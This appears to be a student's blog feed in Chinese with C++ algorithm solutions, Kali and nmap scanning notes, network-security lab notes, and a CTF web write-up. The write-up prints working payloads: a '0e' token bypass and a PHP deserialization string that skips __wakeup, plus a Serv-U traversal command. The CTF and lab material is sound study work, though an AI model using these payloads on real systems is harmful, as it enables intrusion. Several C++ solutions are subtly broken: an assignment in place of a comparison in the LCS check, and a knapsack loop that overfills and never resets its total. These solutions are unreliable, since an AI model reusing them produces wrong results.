class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">100</span>][<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">string</span> a, b;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; a &gt;&gt; b;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= a.length(); i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= b.length(); j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (a[i<span class="number">-1</span>] = b[j<span class="number">-1</span>]) &#123;</span><br><span class="line">m[i][j] = m[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">m[i][j] = max(m[i - <span class="number">1</span>][j], m[i][j - <span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; m[a.length()][b.length()] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="贪心算法"><a href="#贪心算法" class="headerlink" title="贪心算法"></a>贪心算法</h1><h2 id="活动安排"><a href="#活动安排" class="headerlink" title="活动安排"></a>活动安排</h2><p>描述：</p><p>理论上，Nova君是个大闲人，但每天还是有一大堆事要干，大作业啦，创新杯啦，游戏啦，出题坑人啦，balabala……然而精力有限，Nova君同一时间只能做一件事，并不能一心二用。假设现在有N项工作等待Nova君完成，分别在 Si 时刻开始，在 Ti 时刻结束，对于每项工作可以选择做或者不做，但不可以同时选择时间重叠的工作（即使是开始的瞬间和结束的瞬间重叠也是不允许的）。Nova君自然希望尽量多做一些事情，那么最多能做几件事呢</p><p>多组测试数据（数据组数不超过10），对于每组数据，第一行输入一个正整数N，代表可选的工作数量，接下来输入N行，每行两个正整数，代表第 i 个工作的开始时间 si 和结束时间 ti 。</p><p>5<br>1 3<br>2 5<br>4 7<br>6 9<br>8 10</p><p>对于每组数据，输出一行，为可完成的工作的最大数量。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Time</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> s, f;</span><br><span class="line">&#125;m[<span class="number">1005</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">compare</span><span class="params">(Time a, Time b)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.f &lt; b.f;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">cin</span>&gt;&gt;n)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; m[i].s &gt;&gt; m[i].f;</span><br><span class="line">&#125;</span><br><span class="line">sort(m, m + n,compare);</span><br><span class="line"><span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (m[k].f &lt;= m[i].s)</span><br><span class="line">&#123;</span><br><span class="line">sum++;</span><br><span class="line">k = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; sum &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="最优装载"><a href="#最优装载" class="headerlink" title="最优装载"></a>最优装载</h2><p>Description</p><p>有一批集装箱要装上一艘载重量为C的轮船。其中集装箱i的重量为wi。最优装载问题要求确定在装载体积不受限制的情况下，将尽可能多的集装箱装上轮船。</p><p>Input</p><p>输入的第一个为测试样例的个数T（ T &lt;= 100 ），接下来有T个测试样例。每个测试样例的第一行是一个整数n（ n &lt;= 1000 ）和一个非负数C（ C &lt;= 10000 ），分别表示集装箱的个数以及轮船的载重量。接下来有n行，每行一个非负数，表示每个集装箱的重量。</p><p>Output</p><p>输出最多装集装箱的个数和最终的承重量。</p><p>Sample Input</p><p>1<br>5 100<br>20<br>50<br>120<br>99<br>30</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> m[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">int</span> x[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Load</span><span class="params">(<span class="keyword">int</span> x[], <span class="keyword">int</span> m[], <span class="keyword">int</span> c, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (m[i] &lt;= c)</span><br><span class="line">&#123;</span><br><span class="line">x[i] = <span class="number">1</span>;</span><br><span class="line">c -= m[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">compare</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> x &lt; y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> t,n,c,sum=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; t;</span><br><span class="line"><span class="keyword">while</span> (t--) &#123;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n &gt;&gt; c;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; m[i];</span><br><span class="line">x[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">sort(m, m + n, compare);</span><br><span class="line">Load(x, m, c, n);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (x[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; m[i]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">sum += m[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; sum &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="背包问题"><a href="#背包问题" class="headerlink" title="背包问题"></a>背包问题</h2><p>临近开学了，大家都忙着收拾行李准备返校，但 I_Love_C 却不为此担心! 因为他的心思全在暑假作业上：目前为止还未开动。</p><p>暑假作业是很多张试卷，我们这些从试卷里爬出来的人都知道，卷子上的题目有选择题、填空题、简答题、证明题等。而做选择题的好处就在于工作量很少，但又因为选择题题目都普遍很长。如果有 55 张试卷，其中 44 张是选择题，最后一张是填空题，很明显做最后一张所花的时间要比前 44 张长很多。但如果你只做了选择题，虽然工作量很少，但表面上看起来也已经做了 4/5的作业了。</p><p>I_Love_C决定就用这样的方法来蒙混过关，他统计出了做完每一张试卷所需的时间以及它做完后能得到的价值（按上面的原理，选择题越多价值当然就越高咯）。</p><p>现在就请你帮他安排一下，用他仅剩的一点时间来做最有价值的作业。</p><p>输入格式</p><p>测试数据包括多组。每组测试数据以两个整数 M,N(1\leq M\leq 20, 1\leq N\leq 10000)M,N(1≤M≤20,1≤N≤10000) 开头，分别表示试卷的数目和 I_Love_C 剩下的时间。接下来有 MM 行，每行包括两个整数 T,V(1\leq T\leq N,0&lt;V&lt;10000)T,V(1≤T≤N,0&lt;V&lt;10000)，分别表示做完这张试卷所需的时间以及做完后能得到的价值，输入以 0\:000 结束。</p><p>输出格式</p><p>对应每组测试数据输出 I_Love_C 能获得的最大价值。保留小数点 22 位</p><p>提示</p><p>float 的精度可能不够，你应该使用 double 类型。</p><p>样例输入</p><p>4 20<br>4 10<br>5 22<br>10 3<br>1 2<br>0 0<br>样例输出</p><p>37.00</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">baggage</span> &#123;</span></span><br><span class="line"><span class="keyword">double</span> v, t,vt;</span><br><span class="line">&#125;b[<span class="number">1005</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">compare</span><span class="params">(baggage x, baggage y)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> x.vt &gt; y.vt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> m, n;</span><br><span class="line"><span class="keyword">double</span> sum = <span class="number">0.0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; m &gt;&gt; n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (m == <span class="number">0</span> &amp;&amp; n == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; b[i].t &gt;&gt; b[i].v;</span><br><span class="line">b[i].vt = b[i].v / b[i].t;</span><br><span class="line">&#125;</span><br><span class="line">sort(b, b + m, compare);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (b[i].t &lt;= n) &#123;</span><br><span class="line">sum += b[i].v;</span><br><span class="line">n -= b[i].t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">sum += (b[i].vt*n);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; fixed &lt;&lt; setprecision(<span class="number">2</span>) &lt;&lt; sum &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;动态规划&quot;&gt;&lt;a href=&quot;#动态规划&quot; class=&quot;headerlink&quot; title=&quot;动态规划&quot;&gt;&lt;/a&gt;动态规划&lt;/h1&gt;&lt;h2 id=&quot;0-1背包&quot;&gt;&lt;a href=&quot;#0-1背包&quot; class=&quot;headerlink&quot; title=&quot;0-1背包&quot;&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Kali踩坑</title>
    <link href="http://yoursite.com/2018/11/11/Kali/"/>
    <id>http://yoursite.com/2018/11/11/Kali/</id>
    <published>2018-11-10T16:00:00.000Z</published>
    <updated>2018-12-23T04:23:18.684Z</updated>
    
    <content type="html"><![CDATA[<h1 id="open-vm-tools"><a href="#open-vm-tools" class="headerlink" title="open vm tools"></a>open vm tools</h1><pre><code>vi /etc/apt/sources.list</code></pre><h1 id="更新源"><a href="#更新源" class="headerlink" title="更新源"></a>更新源</h1><p>中科大kali源:</p><pre><code>deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free deb-src http://mirrors.ustc.edu.cn/kali-security kali-current/updates main contrib non-free</code></pre><p>阿里云kali源:</p><pre><code>deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb http://mirrors.aliyun.com/kali-security kali-rolling/updates main contrib non-free deb-src http://mirrors.aliyun.com/kali-security kali-    rolling/updates main contrib non-free</code></pre><p>对软件进行一次整体更新： </p><pre><code>apt-get update &amp; apt-get upgrade apt-get dist-upgrade apt-get clean</code></pre><p>如果之前不小心安装了vmware-tools，可以输入 </p><pre><code>vmware-uninstall-tools.pl apt-get install open-vm-tools-desktop fuse reboot卸载apt-get remove open-vm-tools-desktop fuse </code></pre><p>apt-get install open-vm-tools-desktop fuse</p><p>然后再次重启就OK了。。。。。</p><h1 id="nmap学习"><a href="#nmap学习" class="headerlink" title="nmap学习"></a>nmap学习</h1><p>示例    ：</p><pre><code>nmap -F -sT -v nmap.org    -F 100个最有可能开放端口    -v 扫描信息    -sT TCP扫描</code></pre><p>2.端口状态</p><pre><code>Open|Filtered 无返回值，在UDP,IP,FIN,NULL和Xmas扫描中</code></pre><p>3.渗透：</p><pre><code>扫描端口-----端口TCP/UDP----端口HTTP/FTP----端口服务</code></pre><p>域名解析parameter:</p><pre><code>-R 所有目标主机解析--system-dns 系统域名解析器--dns-server 服务器选择DNS解析</code></pre><p>4.扫描方法</p><p>parameter</p><pre><code>-sT (TCP扫描,三次握手机制）-sP(ping扫描，判断主机存活)-sS (半开扫描,需root权限，没有三次握手）-sU(udp扫描，不可靠)-sA(穿防火墙)-sX -sN  圣诞树扫描和NULL扫描，针对Unix和Linux主机-sV(端口服务及版本)-A 操作系统检测-O 启用操作系统检测-v 详细信息-P0 指定端口(无ping)-PU （udp+ping）-PS (TCP SYN PING)-PA (TCP ACK PING)-PI(pingICMP echo测试主机运行 )-T 时间优化-F 快速扫描-e 指定网络接口-M 设置tcp扫描线程NULL 反向扫描（不实用,发送没有标志位数据包，主要确认os为windows）FIN 原理类似NULLACK（发送ACK包，返回RST包，判断RST包中TTL，&lt;64开启）</code></pre><p>5.output</p><pre><code>-oS 保存扫描结果输出-oN 结果重定向log file name中-oM 每个结果一行输出</code></pre><p>6.status</p><pre><code>open 开放 closed 关闭 filtered被过滤 unfiltered未过滤 openfiltered 开放或被过滤 closedfiltered关闭或未过滤</code></pre><p>7.常用命令</p><pre><code>nmap -sP 192.168.0.0/24   判断哪些主机存活nmap -sT 192.168.0.3   开放了哪些端口nmap -sS 192.168.0.127 开放了哪些端口（隐蔽扫描）nmap -sU 192.168.0.127 开放了哪些端口（UDP）nmap -sS -O  192.168.0.127 操作系统识别nmap -sT -p 80 -oG – 192.168.1.* | grep open    列出开放了指定端口的主机列表nmap -sV -p 80 thief.one  列出服务器类型(列出操作系统，开发端口，服务器类型,网站脚本类型</code></pre><p><img src="https://i.imgur.com/br0DBB6.png" alt=""><br><img src="https://i.imgur.com/NfFhigY.png" alt=""><br><img src="https://i.imgur.com/LSsFJez.png" alt=""></p><h1 id="无法拖动文件解决"><a href="#无法拖动文件解决" class="headerlink" title="无法拖动文件解决"></a>无法拖动文件解决</h1><p>1.安装Vmwaretools.</p><ol><li>检查Windows-Vmwaretools服务是否启动</li><li>Vmware客户机隔离是否允许复制粘贴</li><li><p>View—Fit windows now自动适应客户机</p><h1 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h1><p>NetCat。瑞士军刀</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p> [root@server ~]# yum install -y nc<br> [root@server ~]# rpm -q nc<br> nc-1.84-22.el6.x86_64<br>#</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;open-vm-tools&quot;&gt;&lt;a href=&quot;#open-vm-tools&quot; class=&quot;headerlink&quot; title=&quot;open vm tools&quot;&gt;&lt;/a&gt;open vm tools&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;vi /etc/apt/source
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>php函数</title>
    <link href="http://yoursite.com/2018/11/10/ctf/"/>
    <id>http://yoursite.com/2018/11/10/ctf/</id>
    <published>2018-11-09T16:00:00.000Z</published>
    <updated>2018-12-23T04:15:26.119Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php函数"><a href="#php函数" class="headerlink" title="php函数"></a>php函数</h1><p>strpos 返回字符串首次出现位置<br>stripos 返回字符串首次出现位置不区分大小写<br>highlight_file()对文件进行高亮显示</p><h1 id="serialize与unserialize"><a href="#serialize与unserialize" class="headerlink" title="serialize与unserialize"></a>serialize与unserialize</h1><p>unserialize函数在重构对象后自动调用_wakeup成员方法，<br>跳过_wakeup执行，序列化字符串中，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup的执行。</p><p><code>O:&lt;length&gt;:&quot;&lt;class name&gt;&quot;:&lt;n&gt;:{&lt;field name 1&gt;&lt;field value 1&gt;&lt;field name 2&gt;&lt;field value 2&gt;...&lt;field name n&gt;&lt;field value n&gt;}</code></p><h1 id="js函数"><a href="#js函数" class="headerlink" title="js函数"></a>js函数</h1><p><code>JSON.parse()方法解析JSON字符串，构造字符串描述的JavaScript值或对象</code><br><code>setInterval</code><br>定时执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i=<span class="number">1</span></span><br><span class="line"><span class="keyword">var</span> timer=setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line">&#125;,<span class="number">1000</span>)</span><br></pre></td></tr></table></figure><p>参数确保执行结束之后的时间开始。</p><p><code>escape()</code> URL编码<br><code>unescape()</code> URL解码</p><p>XMLHttpRequest(XHR)对象与服务器交互，可以从URL获取数据</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;php函数&quot;&gt;&lt;a href=&quot;#php函数&quot; class=&quot;headerlink&quot; title=&quot;php函数&quot;&gt;&lt;/a&gt;php函数&lt;/h1&gt;&lt;p&gt;strpos 返回字符串首次出现位置&lt;br&gt;stripos 返回字符串首次出现位置不区分大小写&lt;br&gt;highlig
      
    
    </summary>
    
      <category term="code" scheme="http://yoursite.com/categories/code/"/>
    
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>bxs网络平台</title>
    <link href="http://yoursite.com/2018/11/08/%E7%9F%BF%E5%A4%A7%E7%BD%91%E7%BB%9C%E5%AE%9E%E8%AE%AD%E5%B9%B3%E5%8F%B0md/"/>
    <id>http://yoursite.com/2018/11/08/矿大网络实训平台md/</id>
    <published>2018-11-07T16:00:00.000Z</published>
    <updated>2018-12-23T04:21:51.319Z</updated>
    
    <content type="html"><![CDATA[<p>WebWriteup </p><h1 id="Logic"><a href="#Logic" class="headerlink" title="Logic"></a>Logic</h1><ol><li>Burp抓包发现管理员账号<a href="mailto:chenyurui@gmail.com" target="_blank" rel="noopener">chenyurui@gmail.com</a><br><img src="https://i.imgur.com/OhqGoA4.png" alt=""></li><li>看到隐藏信息。Vim编辑.</li><li>验证转入submit.php.</li><li>访问./submit.php发现不是管理员。<br>根据Vim备份漏洞，存在隐藏文件.swp,访问./submit.php.swp<br>访问之后查看源码，构造Token值绕过验证.</li></ol><p><img src="https://i.imgur.com/NWrjtvV.png" alt=""></p><p><code>payload:http://bxs.cumt.edu.cn/challenge/web/logic/submit.php?emailAddress=chenyurui@gmail.com&amp;token=0e00000000</code></p><h1 id="听说你会面向对象"><a href="#听说你会面向对象" class="headerlink" title="听说你会面向对象"></a>听说你会面向对象</h1><p>看到<br><img src="https://i.imgur.com/Afn9U5S.png" alt=""><br>想到反序列化漏洞，构造<img src="https://i.imgur.com/ChD7QBI.png" alt=""><br>结果执行了_wakeup函数，要绕过他的执行，经过查资料如果对象属性个数大于真实属性时会跳过，故修改</p><p><code>O:5:&quot;Admin&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}为O:5:&quot;Admin&quot;:2:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p><p>payload:<code>http://bxs.cumt.edu.cn/challenge/web/php_object_injection/index.php?data=O:5:&quot;Admin&quot;:2:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p><h1 id="colorSnake"><a href="#colorSnake" class="headerlink" title="colorSnake"></a>colorSnake</h1><p>查看源码发现game.js，获取到只要不断访问页面，分数会上升<br><img src="https://i.imgur.com/EJfbVMD.png" alt=""><br>参考别人的思路发现可利用JS计时器。延时1秒，进行访问。代码如下<br>    setInterval(function(){xhr(‘./getScore.php’,function(e){<br>                var r = JSON.parse(e);<br>                if(r.state == 200)<br>                    game.addScore(r.score);<br>                else{<br>                    alert(r.msg);<br>                    game.start()<br>                }</p><pre><code>})},1000)</code></pre><p>弹出flag</p><h1 id="自动获取flag小程序"><a href="#自动获取flag小程序" class="headerlink" title="自动获取flag小程序"></a>自动获取flag小程序</h1><p>源码中找到param1.php<br>访问响应结果<br><code>{&quot;param&quot;:&quot;%5B%221%22%2C%226%22%2C%222%22%2C%228%22%2C%224%22%2C%222%22%2C%228%22%2C%224%22%2C%229%22%2C%221%22%2C%2210%22%5D&quot;}</code><br>URL解码后得到<br><code>[&quot;1&quot;,&quot;6&quot;,&quot;2&quot;,&quot;8&quot;,&quot;4&quot;,&quot;2&quot;,    &quot;8&quot;,&quot;4&quot;,&quot;9&quot;,&quot;1&quot;,&quot;10&quot;]</code><br>分析calParam2可知用数组中的数进行求和运算。</p><p>修改//请求flag中的参数</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;WebWriteup &lt;/p&gt;
&lt;h1 id=&quot;Logic&quot;&gt;&lt;a href=&quot;#Logic&quot; class=&quot;headerlink&quot; title=&quot;Logic&quot;&gt;&lt;/a&gt;Logic&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;Burp抓包发现管理员账号&lt;a href=&quot;mailto:chen
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>网络安全实验</title>
    <link href="http://yoursite.com/2018/11/07/Net%20security/"/>
    <id>http://yoursite.com/2018/11/07/Net security/</id>
    <published>2018-11-06T16:00:00.000Z</published>
    <updated>2018-12-23T04:24:06.602Z</updated>
    
    <content type="html"><![CDATA[<p>Linux 快捷键：<br>终端:<br>复制命令：Ctrl + Shift + C  组合键    .    </p><p>粘贴命令：Ctrl + Shift + V  组合键           </p><p>控制台：<br>复制命令：Ctrl + Insert  组合键　　或　　用鼠标选中即是复制。         </p><p>粘贴命令：Shift + Insert  组合键　　或　　单击鼠标滚轮即为粘贴。                 </p><h1 id="server-u"><a href="#server-u" class="headerlink" title="server-u"></a>server-u</h1><p>Nessus扫描主机。<br>serv-u目录遍历漏洞<br>CMD中输入:<br>ftp ip;<br>ftp； 匿名登陆<br>ls 查看目录，<br>get ../ftp/1.txt获取1.txt文件   </p><p>503 服务器出错<br>404 网页程序出错   </p><h1 id="主机存活性"><a href="#主机存活性" class="headerlink" title="主机存活性"></a>主机存活性</h1><p>ping 发送四次ICMP报文得到回显。<br>ping 探测网段内存活主机。各种命令使用   </p><p>Nmap superScan工具判断主机存活性<br><code>nmap -sn 172.17.135.6-172.17.135.122</code>  空扫描    </p><p>Fping发现网段内存活主机探测。<br><code>fping –a –g 172.17.135.6 172.17.135.122</code> -a 响应目标 -g 起始地址和终止地址    </p><h1 id="主机信息探测"><a href="#主机信息探测" class="headerlink" title="主机信息探测"></a>主机信息探测</h1><p>X-scan探测主机敏感信息<br>MBSA探测主机一些安全配置。   </p><h1 id="端口服务探测"><a href="#端口服务探测" class="headerlink" title="端口服务探测"></a>端口服务探测</h1><p>公认端口；HTTP协议80端口<br>注册端口；<br>动态/私有端口；</p><p>netstat -a -n -o<br>-a 所有socket -n 网路地址代替名称+状态  -o 加上进程PID显示    </p><p>ftp ip 测试21端口ftp服务<br>telnet ip 测试23端口telnet服务<br>mstsc /v ip 测试3389端口可远程连接   </p><p>ScanPort扫描<br>SuperScan扫描<br>nmap扫描 nmap -T4 -A -v ip    </p><h1 id="Wireshark抓包实验"><a href="#Wireshark抓包实验" class="headerlink" title="Wireshark抓包实验"></a>Wireshark抓包实验</h1><p>捕捉TCP包分析<br>捕捉PING命令发送的ICMP包一个request+一个reply;   </p><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>RST比特用来复位，TCP连接三种情况：<br>1.不存在连接端口请求<br>2.异常终止一个链接。<br>3.检测半关闭连接  </p><p>1.全TCP连接 